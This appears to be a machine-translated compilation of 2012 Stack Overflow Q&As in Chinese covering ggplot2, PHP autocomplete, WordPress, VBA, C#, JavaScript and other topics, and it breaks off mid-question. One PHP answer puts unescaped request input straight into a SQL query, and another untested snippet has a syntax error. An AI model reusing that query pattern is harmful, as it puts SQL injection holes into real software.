**相关：** [ggplot2 bar graph 中的 Order Bars](https://stackoverflow.com/questions/5208679/order-bars-in-ggplot2-bar-graph)。该问题涉及基于某些数字特征（例如从最大到最小）的重新排序。我想基于非数据固有的任意原因重新排序。

另外，[如何更改ggplot中离散x比例的顺序？](https://stackoverflow.com/questions/3253641/how-to-change-the-order-of-a-discrete-x-scale-in-ggplot). 这建议对因子水平进行排序，我在下面已经完成了，但是我似乎无法结合对数据进行子集化和保持我想要的因子顺序的行为。

* * *

我有一些产品测试数据，我想让一个特定的样本在我的条形图中脱颖而出。在我的特殊情况下，我想将我感兴趣的样本一直推到一侧并以不同的方式着色（即将我突出显示的样本不按字母顺序向右移动并使其变为绿色）。

这是我尝试做的一个例子：

```
library(ggplot2)
test <- data.frame(names = c("A", "B", "C", "Last", "X", "Y", "Z"))
test$y <- 1:7 
```

如果我按原样绘制，众所周知，这些因素将按字母顺序排列。

```
ggplot(test, aes(x=Names, y=y)) + geom_bar() 
```

![在此处输入图像描述](../Images/4fb9aa69a818a354c03d73111453e96a.png)

我重新排列了这样的级别：

```
test$names <- factor(test$names, levels = test$names[ c(1:3, 5:7, 4) ])
test$names
[1] A    B    C    Last X    Y    Z   
Levels: A B C X Y Z Last 
```

到现在为止还挺好。如果我们现在绘制，我会得到这个，这给了我想要的顺序：

```
ggplot(test, aes(x=names, y=y)) + geom_bar() 
```

![在此处输入图像描述](../Images/d6cb77cd7ab03f9cc908c045ed085aa3.png)

但我想染成`Last`绿色，所以我尝试了这个：

```
p <- ggplot(test[!test$names=="Last" ,], aes(x=names, y=y)) + geom_bar()
p <- p + geom_bar(aes(x=names, y=y), test[test$names=="Last" ,], fill="darkgreen")
p 
```

![在此处输入图像描述](../Images/4b62b2d4a07961123e3d97e5023ccdf5.png)

如果我们查看传递给 ggplot 的我的原位子集：

```
test[!test$names=="Last" , ]$names
[1] A B C X Y Z
Levels: A B C X Y Z Last

test[!test$names=="Last" , ]$names
[1] A B C X Y Z
Levels: A B C X Y Z Last 
```

所以级别排序是正确的，但 ggplot 没有使用它来确定绘图顺序。

我想知道问题是否是来自同一数据框的绘图数据，所以我将它们分开，想知道 ggplot 是否会将单独的数据附加到末尾：

```
test2 <- test[test$names=="Last" , ]
test <- droplevels(test)
test2 <- droplevels(test2)
p <- ggplot(test, aes(x=names, y=y)) + geom_bar()
p <- p + geom_bar(aes(x=names, y=y), test2, fill="darkgreen")
p 
```

结果与上一张图相同，`Last`在中间。

最后，我认为这可以通过 完成`scale_x_discrete`，所以我尝试了这个：

```
p <- ggplot(test[!test$names=="Last" ,], aes(x=names, y=y)) + geom_bar()
p <- p + geom_bar(aes(x=names, y=y), test[test$names=="Last" ,], fill="darkgreen")
p <- p + scale_x_discrete(breaks=test$names[c(1:3, 5:7, 4)])
p 
```

我还是`Last`在中间。

**问题**

*   为什么 ggplot 恢复到字母顺序而不是查看因子级别顺序？
*   是否有另一种（或更好的方法）在情节中挑出一行进行“特殊处理”？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-20T20:35:44.947

获得所需内容的另外两种方法：

1.  使用`scale_x_discrete(drop=FALSE)`这是必要的，因为您使用的两组数据不存在相同的 x 值，尽管`levels()`因素相同。

    ```
    p <- ggplot(test[!test$names=="Last" ,], aes(x=names, y=y)) + geom_bar()
    p <- p + geom_bar(aes(x=names, y=y), test[test$names=="Last" ,], fill="darkgreen")
    p <- p + scale_x_discrete(drop = FALSE)
    p 
    ```

2.  用派生的美学和地图着色（好吧，填充）

    ```
    ggplot(test, aes(x=names,  y=y, fill=(names=="Last"))) +
      geom_bar() +
      scale_fill_manual(breaks = c(FALSE,TRUE), 
                        values = c("black", "darkgreen"),
                        guide = "none") 
    ```

两者都给出了一个看起来就像你的答案中的图表。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-20T17:19:37.957

叹...

答案*在*上面的第二个相关问题中（[如何更改 ggplot 中离散 x 比例的顺序？](https://stackoverflow.com/questions/3253641/how-to-change-the-order-of-a-discrete-x-scale-in-ggplot)），但进一步下降且不被接受。执行此操作的手动方法是 via `scale_x_discrete`，但我认为`breaks=`是方法。它实际上是使用`limits=`.

做我正在寻找的正确代码是：

```
p <- ggplot(test[!test$names=="Last" ,], aes(x=names, y=y)) + geom_bar()
p <- p + geom_bar(aes(x=names, y=y), test[test$names=="Last" ,], fill="darkgreen")
p <- p + scale_x_discrete(limits=test$names[c(1:3, 5:7, 4)])
p 
```

或者，因为我已经重新安排了关卡：

```
p <- ggplot(test[!test$names=="Last" ,], aes(x=names, y=y)) + geom_bar()
p <- p + geom_bar(aes(x=names, y=y), test[test$names=="Last" ,], fill="darkgreen")
p <- p + scale_x_discrete(limits=levels(test$names))
p 
```

![在此处输入图像描述](../Images/b44faa84b833ba6f5cbb7e45276ec9d4.png)

# php - Json 自动完成功能无法正常工作

> ID：11583949
> 
> 赞同：0
> 
> 时间：2012-07-20T17:07:09.223
> 
> 标签：php, json, jquery-ui, jquery

所以我试图从我的数据库中填充一个自动完成的搜索表单。这是我创建数组的 php 代码

```
 $leaders= mysql_query("SELECT model_name,model_id FROM models
             ORDER by model_name DESC");

while($leader=mysql_fetch_array($leaders)){
  $model= $leader['model_name'];
$modelid= $leader['model_id'];
    $name[] = array('label'=> $model, 'value'=> $modelid);

    $count = $count + 1;

}
$fp = fopen('results.php', 'w');
fwrite($fp, json_encode($name));
fclose($fp); 
```

我的问题在于 jquery 自动完成中的某个地方，搜索表单只返回我的 json 中所有产品的巨大列表，而没有在用户键入时进行过滤。我的理想目标是将值分配给 url 的末尾。前任。“http://www.example.com/”+ 值

```
$(function() {
  $("#search").autocomplete({
    source: function(request, response) {
      $.ajax({
        url: "results.php",
        dataType: "json",
        data: { q: request.term },
        success: function(data) {
          response($.map(data, function(value,key) {
            return { label:value.label , value: value.value }
          }));
        }
      });
    },
    minLength: 2
  });
}); 
```

谢谢您的帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T17:21:07.277

我认为你的查询很糟糕。您必须在查询中使用类似条件

```
 mysql_query("SELECT model_name,model_id FROM models where model_name like '$_post[q]%'  ORDER by model_name DESC") 
```

获取特定的选定结果

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T15:37:24.920

正如 arxanas 所说，您似乎需要在对结果进行编码并将其发送回客户端之前对其进行过滤。

这方面的一个示例可能是首先捕获 jquery 自动完成发送到服务器的术语，如下所示

```
$term = $_GET['term']; 
```

然后用它来比较你的名字数组，我想如果你把术语变成这样的模式

```
$term = "/$term/i" 
```

然后创建一个数组来存储匹配的结果并使用 preg_match 循环遍历名称数组，每次匹配模式时，您只需将其值推入返回数组

```
$returnArray = array();

foreach( $name as $index => $value ) {
    if ( preg_match( $term, $value['label'] ) {
        array_push($returnArray, $value);
    };
};

return json_encode($returnArray); 
```

就像我说的那样，我认为这会起作用，但是 preg_match 很慢而且我自己还没有测试过，所以祝你好运！

# wordpress - 如何从wordpress中删除“存档|”？

> ID：11583954
> 
> 赞同：0
> 
> 时间：2012-07-20T17:07:23.840
> 
> 标签：wordpress, wordpress-theming

您如何从 wordpress 类别页面中删除“存档|”并仅显示类别？是否有插件或我需要删除哪些代码？

先感谢您 ;-）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-20T22:41:59.357

我想你的意思是在你的类别页面的某个地方有一个包含“存档|”的标题标签。如果你想摆脱这个字符串，你首先应该寻找的是它是否可以在主题选项页面中的某个地方进行更改（如果适用）。

如果您没有主题选项页面，请在主题文件夹中查找“category.php”。在那里，您应该能够相当容易地找到“存档|”并将其删除。

不要删除任何文件！如果您遇到问题，请发布您主题的 category.php 文件的内容，我一定会尽力帮助您。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-09-08T11:40:03.597

要删除存档页面，我会这样做：从主题中删除archive.php页面（大多数时候它是多余的并且不需要，已经有标签和类别），然后在你的index.php页面中添加这个小代码片段主题。因此，尝试获取在您的网址中添加年份和月份的内容的用户将被重定向到标准 404 页面。

```
if(is_archive()) {
    // force 404
    $wp_query->set_404();
    status_header( 404 );
    nocache_headers();
    include("404.php");
    die;
} 
```

更长的帖子在这里：[http ://www.barattalo.it/2015/09/08/wordpress-remove-archive-pages/](http://www.barattalo.it/2015/09/08/wordpress-remove-archive-pages/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T07:02:52.643

试试**[WP No Category Base](http://wordpress.org/extend/plugins/wp-no-category-base/)**插件。

它确实`/category/`从您的 URL 中删除了 slug，希望它也可以解决您的问题。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2022-01-01T21:23:17.323

我在以下位置找到了删除存档部分的选项：

自定义 ▸ 小部件 ▸ 侧边栏小部件区域：

[http://YourSite.com/wp-admin/customize.php](http://YourSite.com/wp-admin/customize.php)？

[截屏](https://i.stack.imgur.com/1rs9R.png)

* * *

## 回答 #5

> 赞同：-2
> 
> 时间：2012-07-20T17:32:02.297

尝试删除主题文件夹中的archive.php。

# c++ - 程序已退出，代码为 -2147483645

> ID：11583957
> 
> 赞同：9
> 
> 时间：2012-07-20T17:07:30.017
> 
> 标签：c++, visual-c++

我在使用 Visual Studio 调试混合的 WPF/CLR/非托管本机 c++ 项目时遇到了一个有趣（相当烦人）的错误，此错误仅在 Windows XP 中发生。似乎我在程序中发生了内存损坏，其范围太大，无法在此处发布。我遇到的问题是，当程序中发生崩溃时，它只是退出而没有 VS 调试器尝试定位异常，我假设因为没有抛出任何异常。程序退出代码确实是我必须继续下去的唯一信息，它只是最小的 int 值。

有没有人遇到过这种情况，并且可能能够为我指出正确的方向，这意味着什么？

编辑：

继续调查这个问题，我发现有时我可以获得堆栈跟踪和异常，而不是直接退出程序。跟踪将我带到向量分配（推送）。在程序刚刚退出的场景中，这仍然是执行的最后一行。我假设我在某处有损坏的内存，尽管我希望这通常表现为程序转储而不是异常这一事实能够帮助我指出正确的方向。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-07-21T17:31:29.707

```
//
// MessageId: STATUS_BREAKPOINT
//
// MessageText:
//
// {EXCEPTION}
// Breakpoint
// A breakpoint has been reached.
//
#define STATUS_BREAKPOINT                ((NTSTATUS)0x80000003L) 
```

程序到达 INT3 指令并触发断点。但是没有调试器存在，因此终止程序。它可能是您在代码中留下的杂散的 __debugbreak()，当程序状态损坏时，它可能由狂野的跳转触发。

你需要调试它。如果您不能在您的开发机器上轻松地复制它，那么您将需要来自故障机器的小型转储。

# vba - 缩小以适应 Excel / PowerPoint 文本大小

> ID：11583959
> 
> 赞同：2
> 
> 时间：2012-07-20T17:07:37.757
> 
> 标签：vba, excel, textbox, powerpoint

主要问题是 PowerPoint 表格没有缩小以适应选项。

由于我使用 Visual Basic 从 Excel 填充 PowerPoint 演示文稿，因此我能够利用 Excel 的能力来缩小以适应单元格。问题是，如果我将信息粘贴到 PowerPoint 中，它不会使用后期缩小来适应字体大小。我目前剩下的选项是使用 Excel 缩小以适应然后将单元格的图像粘贴到 PowerPoint 中，但这消除了以后编辑表格的能力。

如果有办法让帖子缩小以适应 Excel 中的字体大小，那么我可以填充 PowerPoint 并更改字体大小，但我只知道如何获取单元格的字体大小（未更新以反映缩小到合身）。

任何可以用来缩小以适应 PowerPoint 表格的东西都会有所帮助。

编辑：在输入问题时，我想到了一种可能的解决方法，但它似乎不起作用。我尝试制作一个临时隐藏的文本框，将其重新调整为与单元格相同的大小，将格式更改为单元格的格式，然后为这个临时文本框启用溢出时收缩。问题是当我尝试获取文本大小时，它返回 TextBox 的原始默认值。

```
Function getStringShrinkSize(wid As Double, high As Double, txt As String) As Double
  Set shpCurShape = ActiveWindow.View.Slide.Shapes.AddTextbox(msoTextOrientationHorizontal, 100, 100, wid, high)
  shpCurShape.name = "temp1"
  With shpCurShape
    .height = high
    .Width = wid
    With .TextFrame.TextRange
        With .Font
            .Bold = msoTrue
            .name = "Tahoma"
        End With
    End With
    With .TextFrame2
        .WordWrap = True
        .AutoSize = msoAutoSizeTextToFitShape
        .TextRange = txt
    End With
  End With
  getStringShrinkSize = ActiveWindow.View.Slide.Shapes("temp1").TextFrame.TextRange.Font.Size
End Function

Sub testGetStringShrinkSize()
  Debug.Print ("" & getStringShrinkSize(50, 20, "This is a test"))
  Debug.Print ("second try: " & ActiveWindow.View.Slide.Shapes("temp1").TextFrame.TextRange.Font.Size)
  ActiveWindow.View.Slide.Shapes("temp1").Delete
End Sub 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T10:04:19.510

这似乎是一个时间问题。宏在应用减小的字体大小之前返回。如果您稍后查询字体大小，它将被缩小。

我可以通过某种忙等待计时器来解决这个问题，请参见下面的代码。不完全是一个漂亮的解决方案，但如果您的代码以批处理模式运行并且时间不是问题，它可以为您工作。

```
Function getStringShrinkSize(wid As Double, high As Double, txt As String) As Double
  Set shpCurShape = ActiveWindow.View.Slide.Shapes.AddTextbox(msoTextOrientationHorizontal, 100, 100, wid, high)
  With shpCurShape
    .Height = high
    .Width = wid
    With .TextFrame.TextRange.Font
            .Bold = msoTrue
            .Name = "Tahoma"
            ' Set known default font size
            .Size = 20
    End With
    With .TextFrame2
        .AutoSize = msoAutoSizeTextToFitShape
        .WordWrap = True
        .TextRange = txt
    End With
  End With

  ' Wait until the reduced text size is applied but no longer than 3 seconds
  Dim start As Date
  start = Now
  Do
    DoEvents
  Loop Until shpCurShape.TextFrame2.TextRange.Font.Size <> 20 Or DateDiff("s", start, Now) >= 3

  getStringShrinkSize = shpCurShape.TextFrame2.TextRange.Font.Size

End Function 
```

# c# - 从 TreeView 深处获取 node.value

> ID：11583966
> 
> 赞同：0
> 
> 时间：2012-07-20T17:08:02.697
> 
> 标签：c#, asp.net, treeview

我有一个 TreeView，其中包含所有存储在数据库中的文件夹和文件。我现在使用 AjaxToolkit 中的自动完成搜索功能创建了一个搜索功能。一切都很好，除了我正在努力寻找具有我从搜索中获得的值的节点。我现在认为它必须是一种递归方法，但我不知道该怎么做。

所以，问题是。如何根据已有的节点值在树视图中找到节点。我还需要获取所有父节点值。所以我可以从中选择节点。

以下是部分代码（在搜索完成后的回发中）：

```
 else
            {   
                // postBack handler for AJAX AutoComplete Extender - JavaScript call: AutoCompletedClientItemSelected
                if (Request.Form["__EVENTTARGET"] != null &&
                Request.Form["__EVENTTARGET"] == "AutoCompleteExtender" &&
                Request.Form["__EVENTARGUMENT"] != null)
                {   
                    //i have the value for the node, but i need to search for it here, 
                    //and i also need the node-values from all the parents. I need the "path"
                    string nodeValue = Session["NodeValueFromSearchForm"].ToString();
                    string nodePath = "";

                    foreach (TreeNode node in TreeViewFolders.Nodes)
                    {
                        if (node.Value == nodeValue)
                        {
                            //I'm stuck here
                            nodePath += "\\s" + node.Value;

                        }
                    }

                    string prompt = String.Format("<script>{0}{1}{2}</script>", "javascript:__doPostBack('TreeViewFolders','s", nodePath, "')");                    
                    ScriptManager.RegisterStartupScript(this, GetType(), "message", prompt, false);                    
                }
            } 
```

在`foreach`循环中，我只得到“根”文件夹（在顶部）。如何递归地执行此操作，以到达子节点，最后找到我拥有唯一 node.value 的节点？

**感谢 Georges Oates Larsen 的回答，**我得到了它的工作。**当用户在树视图中上传文件时，我没有考虑只保存节点的值路径。所以，现在我在上传过程中将值路径保存在我的“文件”表中，并将该值传递给`__doPostBack`**

 *** * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T19:03:46.400

我不完全确定您的 TreeView 对象的工作方式有多精确，或者您如何存储它的数据（或者它是否存储自己的数据）。但是，我确实对树搜索算法有所了解。

查找所需内容的最快方法主要取决于您的树是否已排序。我将假设它没有排序，这意味着解决方案将有 O(N) 的最坏情况，N 是树中的节点数。

还有不同类型的树——我将假设您使用的是普通的老树（任意数量的子树，不超过一个父节点，一个根节点）。如果您提供有关您正在使用的树的更多信息，我们可以提供有关如何最好地遍历它的更好信息。

鉴于这些假设，伪代码如下：

```
public TreeNode[] SearchTree(Tree YourTree, SearchObject SearchingFor)
{
    return SearchNode(0, YourTree.RootNode, SearchingFor);//Depth is sent in so that our recursion can keep track of how many parents the node has. This allows us to use simple arrays which are far faster than any alternative serial data storage.
}

public TreeNode[] SearchNode(int depth, TreeNode YourNode, SearchObject SearchingFor)
{
    //Edge case

    if (SearchingFor.Matches(YourNode))//Does the node match our search?
    {
        return GetHeritage(depth, YourNode);//We get the heritage at the end because it's faster than using a dynamically allocated array for every single recursion we do when only one will ever get used. That practically makes the memory used exponential! Not ot mention all of the slowdown caused by the algorithms required for reallocation.
    }

    //Recurse

    TreeNode[] ret = null;
    for (int i = 0; i < YourNode.ChildNodes.Length; i++)
    {
        //Set the ret temporary variable to our recursion, then see if it is null or not
        if ((ret = SearchNode(depth+1, YourNode.ChildNodes[i])) != null)
        {
            break;//Exit the loop!
        }
    }

    //Return the result

    return ret;//If we find the correct answer, the loop will break with ret at the correct value.
    //If, however, we do not find anything correct within this node, we will simply return null.
}

//Final calculation for the correct result.

public TreeNode[] GetHeritage(int depth, TreeNode YourNode)//This will list every node starting from the node we found going all the way back to the root node. The first element in the array returned will be the root node.
{
    TreeNode[] ret = new TreeNode[depth+1];
    ret[depth] = YourNode;//Depth is actually one less than our length, so... Hurrah!
    for (int i = depth; i >= 0; i--)
    {
        ret[depth-i] = ret[depth-(i-1)].Parent;
    }

    return ret;
} 
```

编辑：我已经阅读了您的一些评论：

一种更快的方法是简单地创建一个数组并使用“自动递增 ID”的索引添加对每个节点的引用，每次向 TreeView 添加内容时，该索引都指向相应的节点。然后要获取您的号码的路径，只需查看辅助数组中 index[number] 处的节点，然后跟随其父节点直到根节点！:)**

# android - 我是否发现了带有 Android 位置数据的本地化错误？

> ID：11583967
> 
> 赞同：0
> 
> 时间：2012-07-20T17:08:08.517
> 
> 标签：android, localization, location

在不复制粘贴特定代码的情况下，我将尽可能详细地介绍。

我有从 Location 对象中提取 Lat/Lon 的代码。默认情况下，我在生成的 Double 中获得十进制度数 (##.#####)。我想要以下格式的 DMS (## ###' ##.####") 所以我要求 Location.convert 在 FORMAT_SECONDS 中给我（api 说我会得到 ##:##:## .####）。

这里没有问题，我可以解析 :'s 并将它们转换为空格或'......但问题是......当将语言从英语更改为德语时，我遇到了小数分隔符问题。

在德语中，Decimal Degrees 回复仍然给出 (.) 作为分隔符，但是在我要求 Loaction 对象进行转换后，它给了我秒值的 (,) 分隔符。

API 明确指出，转换为 FORMAT_SECONDS 会返回 (.) 作为分隔符。我对本地化调整并不感到惊讶（我也没有卡住......）我感到惊讶的是，我认为是一个错误是在 Location 对象中使用转换函数时我得到了不同的分隔符。我在代码中从 Location 对象（速度、准确性）中记录的所有其他数值在德语中都使用 (.) 作为分隔符。

有人遇到过这个吗？同样，不是在寻找修复，而是看人们是否认为这是一个错误。

# javascript - 如何在另一个原型事件完成后触发原型事件？

> ID：11583975
> 
> 赞同：1
> 
> 时间：2012-07-20T17:08:47.163
> 
> 标签：javascript, prototypejs, scriptaculous

例如，这样做：

```
new Effect.Move('agrupador', { x: -100, y: 0, mode: 'relative' });
Element.setStyle('agrupador', {left: '0px' }); 
```

在元素向左移动之前应用左侧位置，但我想要相反。

有没有办法做到这一点？

PD：我会烧掉原型，我保证。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-21T06:58:29.040

这是一个小提琴：

[http://jsfiddle.net/uF9Dh/](http://jsfiddle.net/uF9Dh/)

```
new Effect.Move('agrupador', {
    x: -100,
    y: 0,
    mode: 'relative',
    afterFinish: function() {
        Element.setStyle('agrupador', {left: '0px' });
    }
});
​ 
```

移动效果是异步的。当您调用 时`new Effect.Move()`，您正在设置在一秒钟内发生的事情。在您发布的代码中，您将`left`属性设置为`0px`在实例化效果之后，**而不是在效果完成之后**。`afterFinish`为此目的有一个回调。[您可以在此处](http://madrobby.github.com/scriptaculous/core-effects/)查看 Scriptaculous 效果的其他可用回调。

顺便说一句 - 这个问题不是原型或 Scriptaculous 特定的，而是 Javascript 中异步操作的工作方式。

# c# - DoEvents() 挂起

> ID：11583979
> 
> 赞同：-1
> 
> 时间：2012-07-20T17:08:57.487
> 
> 标签：c#, .net, frameworks, doevents

我如何删除这个问题？我最初认为该问题与 DoEvents 有关，但事实证明并非如此。我在这里重新发布了这个问题：http: [//goo.gl/VpAEK](http://goo.gl/VpAEK)对问题进行了更恰当的描述。

谢谢-我感谢有关如何处理此问题的任何指导...

* * *

首先，我知道这个问题，因为之前已经问过一个一般概念 - 我（希望）有一个具体的变化要问。我还将开始说，我理解**不**使用 Application.DoEvents() 的具体原因，并预先向每个人保证我们尽可能避免使用它，并且在整个过程中都有多个线程解决问题（没有 Application.DoEvents() 参与）我们的应用程序。

话虽如此，它**是**框架的一部分——我认为在某些特定情况下它占有一席之地。

我要问的具体情况是单线程情况，纯粹涉及 UI，其中（据我了解），根据定义 - 这不能在后台线程中完成。更具体地说，我们正在加载/配置表单中的许多 UI 元素，有时需要 1-2 秒才能完成，我希望在此过程中更新一个标签，指示正在发生的事情。在后台线程中确实没有任何繁重的工作/工作要做 - 这都是 UI。

如果在 4 个标签文本更改后我没有 Application.DoEvents() 调用，则标签不会自行重绘。如果有人可以提出一个替代方案，在纯 UI、**单线程**环境中以不同的方式解决这个问题——我全都听好了。

问题是，偶尔，如果我仍在尝试确定，Application.DoEvents() 根本不会返回。

我真的理解所有关于 DoEvents() 方法的抱怨（其中大部分是完全有效的！！！）以及它可能导致的各种问题！因此，理想情况下，无需就 DoEvents 调用的利弊进行激烈辩论（正如几乎所有其他关于该主题的线程似乎都在做的那样）——我要回答的具体问题是——任何人都可以想到任何理由为什么 DoEvents 会简单地挂起？（即不返回）？

如果你想辩论 DoEvents() 调用本身，这里有一个**很好的**描述它的优点和缺点：http: [//goo.gl/4BtZf](http://goo.gl/4BtZf)

*   我们的用户报告说，这似乎在他们使用该应用程序时不会发生，而是仅在他们离开计算机一段时间后才会发生（可能涉及屏幕保护程序？）我们在更改屏幕分辨率时注意到了它，而远程查看我们客户的计算机。
*   我们有用户坚持认为应用程序最小化时会发生更多。
*   我们有用户坚持认为，当应用程序被最小化时，这种情况发生得更多，他们在 IE 和/或 Outlook 中做了一些工作。

在内部，我们几乎完全无法重现它，除了今天早上我完成了上述所有操作，包括禁用我的网络连接一两分钟和 VPN 连接到服务器几分钟——所有这些都是在我们的应用程序被最小化的情况下进行的。

在此之后（实际上是我们第一次能够在内部重现它），应用程序挂起，当我附加到该进程时，它挂在 Application.DoEvents() 行上。2线法：

label.Text = "Foo"; 应用程序.DoEvents();

多个附加测试（尝试执行相同的操作）无法重现该问题。

有什么建议么？谢谢。

* * *

编辑：尝试得到一个专门关于 DoEvents 的问题的答案是禁忌吗？我对 StackOverflow 比较陌生，我只是有点困惑为什么我已经得到了两次反对票。

我已经在其他线程中多次看到这个问题，并且（至少在我看来，几乎普遍的反应是 - 不要使用 application.DoEvents()）。我特别试图在我最初的问题中考虑周到，并解释为什么我们在这种情况下使用它。同时，我特别试图避免再次讨论为什么不应该使用 DoEvents。如果有足够多的人认为某事是个坏主意，那么在 stackoverflow 上讨论它只是禁忌吗？同样，我对这个论坛比较陌生，并试图了解这里的礼仪。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-20T17:44:02.467

假设利用其他 [后台] 线程来执行此任务是错误的，这是不正确的。如果你想走那条路`Application.DoEvents`就好了。我不会坐在这里告诉你不能使用它，但你至少应该*考虑*不将其用作可能的替代方案。正如您所说，您正在做的是更新大量不同的 UI 元素。您不是在执行单个 UI 任务，而是在执行很多（数十个、数百个、数千个等等）任务。您还有一个单独的任务负责管理所有这些较小的任务。这种对较小任务的管理可以在 UI 线程或非 UI 线程中完成。如果您在 UI 线程中执行此操作，则 UI 将被阻塞，直到每个子 UI 操作完成。如果您有一个仅充当“调度程序”的非 UI 线程，则添加一些较小的 UI 任务来完成，那么这些较小的 UI 任务可以独立执行，并允许 UI 执行......无论......在一些那些任务。

这是一个例子：

```
private void button1_Click(object sender, EventArgs e)
{
    Task.Factory.StartNew(() =>
    {
        for (int i = 0; i < 10; i++)
        {
            Invoke(new MethodInvoker(() => updateLabel(i)));
            Invoke(new MethodInvoker(() => longerUITask(i)));
        }
    });
}

private void longerUITask(int i)
{
    //do databinding that will take a second or two
    Thread.Sleep(1000);
}

private void updateLabel(int i)
{
    label1.Text = i.ToString();
} 
```

这样做效率会降低吗。是的，会的。您将产生其他线程/任务，管理它们等。但是，您获得的成本是简单而有效的保证 UI 将保持响应。

# excel - 如何让宏对预先选择的一系列单元格进行操作？

> ID：11583987
> 
> 赞同：0
> 
> 时间：2012-07-20T17:09:45.910
> 
> 标签：excel, selection

所以，我有一个宏循环遍历工作表上的许多单元格并对它们进行处理。

这是代码[http://pastie.org/4290581](http://pastie.org/4290581)

```
Private Sub ReplaceFormulaWithValues()
    Dim lastrow As Long, r1 As Long
    Dim temp As String, arTemp
    Dim temp2 As String
    Dim temp3 As String

    Dim letter

    temp3 = ""

        ' Get the last row in the worksheet
    lastrow = ActiveSheet.Cells.SpecialCells(xlCellTypeLastCell).Row

    For r1 = 1 To lastrow

        For r2 = 0 To 10
            letter = Chr(Asc("A") + r2)
            letter = letter + LTrim(Str(r1))

            ' If A & B aren't blank, make the formula of cell C equal to A + B.
            If Sheet1.Range(letter).Value <> "" And Mid(Sheet1.Range(letter).Formula, 1, 1) = "=" Then
                If Asc(Mid(Sheet1.Range(letter).Formula, 2, 1)) >= 65 And Asc(Mid(Sheet1.Range(letter).Formula, 2, 1)) <= 90 Then
                    ' Get the formula for the current C cell
                    temp = Replace(Sheet1.Range(letter).Formula, "=", "")

                    'Create an array by splitting the formula on the + sign
                    arTemp = Split(temp, "+")

                    temp2 = Sheet1.Range(arTemp(0)).Value

                    For i = 1 To UBound(arTemp)
                        temp3 = Sheet1.Range(arTemp(i)).Value
                        temp2 = temp2 & "+" & temp3

                    Next i

                    Sheet1.Range(letter).Value = "=" & temp2
                End If

            End If

        Next
    Next
End Sub 
```

[这](http://www.reddit.com/r/excel/comments/wvd02/question_replace_the_cell_reference_in_the/)就是它的作用：

```
for instance, let's say that the formula of cell C2 is C2=A1+B1, where A1 = 10 and B1 = 20.
I would like to change it so that the formula of cell C2 is C2=10+20.
However, I don't want the formula displayed in the cell or anything. 
```

我的问题：如何设置它以便我首先可以从工作表中突出显示/选择一组单元格，然后激活宏以便宏仅适用于该范围内的每个单元格？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T18:11:16.723

该程序当前使用两个 for 循环遍历工作表中的所有单元格。可以将这些循环修改为仅使用 Application.Selection 循环遍历当前选择。

因此，您的代码将如下所示：

```
For Each cell In Selection.Cells

    ' If A & B aren't blank, make the formula of cell C equal to A + B.
    If cell.Value <> "" And Mid(cell.Formula, 1, 1) = "=" Then
            If Asc(Mid(cell.Formula, 2, 1)) >= 65 And Asc(Mid(cell.Formula, 2, 1)) <= 90 Then
                ' Get the formula for the current C cell
                temp = Replace(cell.Formula, "=", "")

                'Create an array by splitting the formula on the + sign
                arTemp = Split(temp, "+")

                temp2 = ActiveSheet.Range(arTemp(0)).Value

                For i = 1 To UBound(arTemp)
                    temp3 = ActiveSheet.Range(arTemp(i)).Value
                    temp2 = temp2 & "+" & temp3

                Next i

                cell.Value = "=" & temp2
            End If

        End If

Next 
```

我还使用 ActiveSheet 而不是 Sheet1，以便您可以在任何工作表上运行它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-20T18:16:18.783

我不会重写您的代码 - 但通常您可以循环遍历您选择的一堆单元格，如下所示：

```
Sub ClearZeroCells()

    Dim cell As Range
    For Each cell In Selection
        If cell = 0 Then cell.ClearContents
        ' or you can put your own code here.
    Next cell

End Sub 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-20T20:45:59.467

我试着做一些我认为你想要实现的事情。

它（宏 EvaluateSelection）应该查看您选择中包含公式（开始 =）的每个单元格，并将其更改为半评估公式。

```
Sub EvaluateTarget(ByVal Target As Range)
Dim Result As String
Dim Cell As Range
Dim Precedent As Range

Dim Formula As String
Dim CellReference As String
Dim CellFormula As String

    Formula = Target.Formula

    For Each Cell In Target.SpecialCells(xlCellTypeFormulas)
        For Each Precedent In Cell.DirectPrecedents
            CellReference = Replace(Precedent.Address, "$", "")
            CellFormula = Replace(Precedent.Formula, "=", "")
            Formula = Replace(Formula, CellReference, CellFormula)
        Next Precedent
    Next Cell

    Target.Value = Replace(Target.Address, "$", "") & Formula

End Sub

Sub EvaluateSelection()
Dim Cell As Range

For Each Cell In Selection.Cells
    If Left(Cell.Formula, 1) = "=" Then
        EvaluateTarget Cell
    End If
Next Cell
End Sub 
```

[参考](http://www.excelforum.com/showthread.php?t=774678&p=2519653&viewfull=1#post2519653)- 找到这个并从中工作。

我根本没有测试过这么多，似乎适用于我的简单示例。

# ada - 为通用编程学习 Ada 有意义吗？

> ID：11583994
> 
> 赞同：2
> 
> 时间：2012-07-20T17:10:17.080
> 
> 标签：ada

我读过 Ada 坚如磐石，非常可靠，而且它有很多编程资源。学习和使用 Ada 进行一般编程有意义吗？（即不适用于科学或工程项目）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T09:39:37.347

是的，学习和使用 Ada 进行编程确实很有意义，但是（通常情况下）这在很大程度上取决于您到底对什么感兴趣（我唯一确定的是 Ada 相当糟糕进行快速和肮脏的黑客攻击的选择（不是不能完成））。

# tree - 树上的链接操作通过传递的参数打开带有结果的报告

> ID：11583998
> 
> 赞同：0
> 
> 时间：2012-07-20T17:10:29.780
> 
> 标签：tree, report, oracle-apex

我需要知道如何通过单击树节点在树的同一页面上过滤报告（经典/交互式）。可以在此站点上找到一个示例：

